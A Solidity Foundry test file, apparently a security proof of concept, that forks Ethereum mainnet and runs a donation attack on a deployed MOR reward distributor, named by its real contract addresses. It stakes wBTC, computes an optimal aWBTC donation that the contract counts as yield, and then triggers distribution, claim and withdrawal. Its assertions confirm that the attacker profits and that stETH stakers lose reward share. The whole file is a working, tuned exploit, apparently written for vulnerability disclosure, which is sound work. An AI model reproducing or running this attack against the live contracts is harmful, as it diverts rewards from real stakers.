// SPDX-License-Identifier: MIT
// PoC A — Lead 1 (T5): fake yield via direct aWBTC donation to DistributorV2.
// Forks Ethereum mainnet at a pinned block. Unprivileged attacker only.
// Nothing here touches mainnet state; all calls run on the fork.
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IERC20Lite {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IDistributorLite {
    function distributeRewards(uint256) external;
    function depositPools(uint256, address)
        external
        view
        returns (
            address token,
            string memory chainLinkPath,
            uint256 tokenPrice,
            uint256 deposited,
            uint256 lastUnderlyingBalance,
            uint8 strategy,
            address aToken,
            bool isExist
        );
    function distributedRewards(uint256, address) external view returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
    function depositPoolAddresses(uint256, uint256) external view returns (address);
    function aavePoolAddressesProvider() external view returns (address);
}

interface IRewardPoolLite {
    function getPeriodRewards(uint256, uint128, uint128) external view returns (uint256);
}

interface IDepositPoolLite {
    function stake(uint256, uint256, uint128, address) external;
    function withdraw(uint256, uint256) external;
    function claim(uint256, address) external payable;
    function getLatestUserReward(uint256, address) external view returns (uint256);
    function rewardPoolsData(uint256) external view returns (uint128, uint256, uint256);
}

interface IAavePoolAddressesProvider {
    function getPool() external view returns (address);
}

interface IAavePoolLite {
    function supply(address, uint256, address, uint16) external;
}

interface IChainLinkConsumerLite {
    function getPathId(string memory) external view returns (bytes32);
    function getChainLinkDataFeedLatestAnswer(bytes32) external view returns (uint256);
}

contract PocA is Test {
    string constant ETH_RPC = "https://eth.drpc.org";
    uint256 constant BLOCK = 26432684;

    address constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant REWARD_POOL = 0xb7994dE339AEe515C9b2792831CD83f3C9D8df87;
    address constant WBTC_POOL = 0xdE283F8309Fd1AA46c95d299f6B8310716277A42;
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant CHAINLINK_CONSUMER = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e;

    uint256 constant STAKE_SATS = 5e8; // 5 wBTC
    uint256 constant MOR_PRICE_MICRO = 697000; // $0.697 per MOR, in micro-USD
    uint256 constant CLAIM_VALUE = 0.1 ether;

    struct RunResult {
        uint256 pendingW1; // MOR (1e18) pending right after the attacked distribution
        uint256 distWbtc; // MOR credited to wBTC pool by Distributor
        uint256 distSteth; // MOR credited to stETH pool by Distributor
        uint256 pendingPreClaim; // MOR pending just before claim (after 14d warp)
        uint256 wbtcReturned; // wBTC (sats) recovered by withdraw
        uint256 donationSats; // aWBTC (sats) donated, 0 in control
        uint256 donationUsdMicro; // USD value of donation, micro-USD
        uint256 rMor; // window emission, MOR
        uint256 yUsdMicro; // window natural yield, micro-USD
        uint256 shareMicro; // attacker share of wBTC pool virtual, 1e6 = 100%
        uint256 pendingAfterClaim; // MOR pending after claim (expect 0)
        bool claimedOk;
    }

    function _sqrt(uint256 x) internal pure returns (uint256) {
        if (x == 0) return 0;
        uint256 z = (x + 1) / 2;
        uint256 y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
        return y;
    }

    /// @dev Measure natural yield (USD, micro) across all 5 pool-0 pools at the
    /// current fork time: sum over pools of max(0, balance - lastUnderlying) * price.
    function _measureYieldMicro() internal view returns (uint256 yMicro, uint256 yWbtcMicro) {
        IDistributorLite dist = IDistributorLite(DISTRIBUTOR);
        for (uint256 i = 0; i < 5; i++) {
            address poolAddr = dist.depositPoolAddresses(0, i);
            (, , uint256 price, , uint256 lastUnderlying, uint8 strategy, address aToken, ) = dist.depositPools(
                0,
                poolAddr
            );
            address yieldToken = strategy == 2 ? aToken : _tokenOf(poolAddr);
            uint256 bal = IERC20Lite(yieldToken).balanceOf(DISTRIBUTOR);
            if (bal <= lastUnderlying) continue;
            uint256 delta = bal - lastUnderlying;
            uint8 dec = IERC20Lite(yieldToken).decimals();
            uint256 delta18 = delta * (10 ** (18 - dec));
            // usd micro = delta18 * price(1e18) / 1e18 / 1e12
            uint256 usdMicro = (delta18 * price) / 1e30;
            yMicro += usdMicro;
            if (poolAddr == WBTC_POOL) yWbtcMicro = usdMicro;
        }
    }

    function _tokenOf(address poolAddr) internal view returns (address) {
        (address token, , , , , , , ) = IDistributorLite(DISTRIBUTOR).depositPools(0, poolAddr);
        return token;
    }

    function _donate(address attacker, uint256 rUsdMicro, uint256 shareMicro, uint256 yMicro)
        internal
        returns (uint256 donationSats, uint256 donationUsdMicro)
    {
        IDistributorLite dist = IDistributorLite(DISTRIBUTOR);
        require(rUsdMicro * shareMicro / 1e6 > yMicro, "window unprofitable: R*s <= Y");
        // R*s*Y in micro-USD^2: shareMicro carries a 1e6 scale, so divide once by 1e6.
        uint256 dStarMicro = _sqrt((rUsdMicro * shareMicro * yMicro) / 1e6) - yMicro;
        (, , uint256 wbtcPrice, , , , , ) = dist.depositPools(0, WBTC_POOL);
        uint256 donateSats = (dStarMicro * 1e12 * 1e8) / wbtcPrice; // micro-USD -> 1e18 USD -> sats
        address aavePool = IAavePoolAddressesProvider(dist.aavePoolAddressesProvider()).getPool();
        deal(WBTC, attacker, donateSats + 100);
        vm.startPrank(attacker);
        IERC20Lite(WBTC).approve(aavePool, donateSats);
        IAavePoolLite(aavePool).supply(WBTC, donateSats, attacker, 0);
        vm.stopPrank();
        (, , , , , , address aWbtc, ) = dist.depositPools(0, WBTC_POOL);
        uint256 aBal = IERC20Lite(aWbtc).balanceOf(attacker);
        vm.prank(attacker);
        IERC20Lite(aWbtc).transfer(DISTRIBUTOR, aBal);
        donationSats = aBal;
        donationUsdMicro = (aBal * wbtcPrice) / 1e20; // sats(1e8) * price(1e18) -> micro-USD: /1e8/1e12
    }

    /// @dev ORACLE-LIVENESS EMULATION (disclosed fork limitation, not protocol logic).
    /// On a frozen fork the Chainlink feeds never post a new round, so after any
    /// warp past the stETH feed's 3600s allowedPriceUpdateDelay,
    /// ChainLinkDataConsumer.getChainLinkDataFeedLatestAnswer returns 0 and
    /// Distributor.updateDepositTokensPrices reverts ("DR: price for pair is zero").
    /// On live mainnet the feeds report continuously (the protocol distributes
    /// daily in production), so a real distribution 1 day later sees fresh prices.
    /// This mock stands in for that liveness only: it makes the consumer return
    /// the actual pinned-block price for each pool's path. It does NOT touch the
    /// Distributor/DepositPool accounting, the donation, the yield measurement,
    /// or the reward split — those all execute for real. Prices are ratio inputs;
    /// the pinned values are used verbatim.
    function _mockPrices() internal {
        IDistributorLite dist = IDistributorLite(DISTRIBUTOR);
        IChainLinkConsumerLite consumer = IChainLinkConsumerLite(CHAINLINK_CONSUMER);
        for (uint256 i = 0; i < 5; i++) {
            address poolAddr = dist.depositPoolAddresses(0, i);
            (, string memory path, uint256 price, , , , , ) = dist.depositPools(0, poolAddr);
            bytes32 pathId = consumer.getPathId(path);
            vm.mockCall(
                CHAINLINK_CONSUMER,
                abi.encodeWithSelector(consumer.getChainLinkDataFeedLatestAnswer.selector, pathId),
                abi.encode(price)
            );
        }
    }

    function _run(bool donate) internal returns (RunResult memory res) {
        IDistributorLite dist = IDistributorLite(DISTRIBUTOR);
        IDepositPoolLite wbtcPool = IDepositPoolLite(WBTC_POOL);

        _mockPrices();

        address attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);
        deal(WBTC, attacker, STAKE_SATS);

        uint128 lastCalc = dist.rewardPoolLastCalculatedTimestamp(0);
        uint256 gateOpen = uint256(lastCalc) + 86401;

        (, , uint256 virtBefore) = wbtcPool.rewardPoolsData(0);

        // 1. Stake 5 wBTC, no lock, no referrer. NOTE: Distributor.supply pulls
        // the wBTC straight from the staker, so the DISTRIBUTOR is approved.
        vm.startPrank(attacker);
        IERC20Lite(WBTC).approve(DISTRIBUTOR, STAKE_SATS);
        wbtcPool.stake(0, STAKE_SATS, 0, address(0));
        vm.stopPrank();

        (, , uint256 virtAfter) = wbtcPool.rewardPoolsData(0);
        res.shareMicro = ((virtAfter - virtBefore) * 1e6) / virtAfter;

        // 2. Warp to just past the distribution gate and measure the window.
        vm.warp(gateOpen);
        (uint256 yMicro, ) = _measureYieldMicro();
        res.yUsdMicro = yMicro;
        res.rMor = IRewardPoolLite(REWARD_POOL).getPeriodRewards(0, lastCalc, uint128(gateOpen));

        // 3. Donation (attack only): D* = sqrt(R*s*Y) - Y, minted as aWBTC by
        // supplying wBTC to Aave on the fork, then transferred to the Distributor.
        if (donate) {
            uint256 rUsdMicro = (res.rMor * MOR_PRICE_MICRO) / 1e18;
            (res.donationSats, res.donationUsdMicro) = _donate(attacker, rUsdMicro, res.shareMicro, yMicro);
        }

        // 4. Anyone may trigger the distribution; the donation is counted as yield.
        dist.distributeRewards(0);
        res.pendingW1 = wbtcPool.getLatestUserReward(0, attacker);
        res.distWbtc = dist.distributedRewards(0, WBTC_POOL);
        res.distSteth = dist.distributedRewards(0, STETH_POOL);

        // 5. Warp past the 14-day claim lock (+7-day withdraw lock) and claim.
        // NOTE: claim() itself calls distributeRewards() again, so the claimed
        // total also includes later windows; pendingW1 above is the clean
        // attacked-window measure. pendingPreClaim is read before claiming.
        vm.warp(block.timestamp + 14 days + 1);
        res.pendingPreClaim = wbtcPool.getLatestUserReward(0, attacker);
        vm.prank(attacker);
        try wbtcPool.claim{value: CLAIM_VALUE}(0, attacker) {
            res.claimedOk = true;
        } catch {
            res.claimedOk = false;
        }
        res.pendingAfterClaim = wbtcPool.getLatestUserReward(0, attacker);
        // 6. Withdraw the principal.
        uint256 wbtcBefore = IERC20Lite(WBTC).balanceOf(attacker);
        vm.prank(attacker);
        wbtcPool.withdraw(0, STAKE_SATS);
        res.wbtcReturned = IERC20Lite(WBTC).balanceOf(attacker) - wbtcBefore;
    }

    function testDonationAttackVsControl() public {
        uint256 forkA = vm.createFork(ETH_RPC, BLOCK);
        uint256 forkB = vm.createFork(ETH_RPC, BLOCK);

        vm.selectFork(forkA);
        RunResult memory atk = _run(true);
        vm.selectFork(forkB);
        RunResult memory ctl = _run(false);

        uint256 gainMor = atk.pendingW1 > ctl.pendingW1 ? atk.pendingW1 - ctl.pendingW1 : 0;
        uint256 gainUsdMicro = (gainMor * MOR_PRICE_MICRO) / 1e18;
        int256 netMicro = int256(gainUsdMicro) - int256(atk.donationUsdMicro);

        console.log("=== PoC A - block", BLOCK);
        console.log("R window MOR:", atk.rMor);
        console.log("Y natural yield micro-USD:", atk.yUsdMicro);
        console.log("attacker wBTC-pool share (1e6=100%):", atk.shareMicro);
        console.log("donation aWBTC sats:", atk.donationSats);
        console.log("donation USD micro:", atk.donationUsdMicro);
        console.log("ATTACK pendingW1 MOR:", atk.pendingW1);
        console.log("CONTROL pendingW1 MOR:", ctl.pendingW1);
        console.log("gain MOR:", gainMor);
        console.log("gain USD micro:", gainUsdMicro);
        console.log("ATTACK distWbtc MOR:", atk.distWbtc);
        console.log("CONTROL distWbtc MOR:", ctl.distWbtc);
        console.log("ATTACK distSteth MOR:", atk.distSteth);
        console.log("CONTROL distSteth MOR:", ctl.distSteth);
        console.log("ATTACK claimedOk:", atk.claimedOk);
        console.log("CONTROL claimedOk:", ctl.claimedOk);
        console.log("ATTACK pendingPreClaim MOR:", atk.pendingPreClaim);
        console.log("ATTACK wbtcReturned sats:", atk.wbtcReturned);
        console.log("CONTROL wbtcReturned sats:", ctl.wbtcReturned);

        // Core assertions: the donation caused the gain, net of its cost.
        assertGt(atk.pendingW1, ctl.pendingW1, "donation did not increase pending rewards");
        assertGt(netMicro, 0, "attack not profitable net of donation");
        // Victims lose: the stETH pool's share of the same fixed emission shrinks.
        assertLt(atk.distSteth, ctl.distSteth, "stETH pool share did not shrink");
        assertGt(atk.distWbtc, ctl.distWbtc, "wBTC pool share did not grow");
        // Claim path works and principal is recoverable.
        assertTrue(atk.claimedOk, "attack claim() reverted");
        assertEq(atk.pendingAfterClaim, 0, "pending not zeroed after claim");
        assertGe(atk.wbtcReturned, STAKE_SATS - 10000, "principal not recoverable");
    }
}
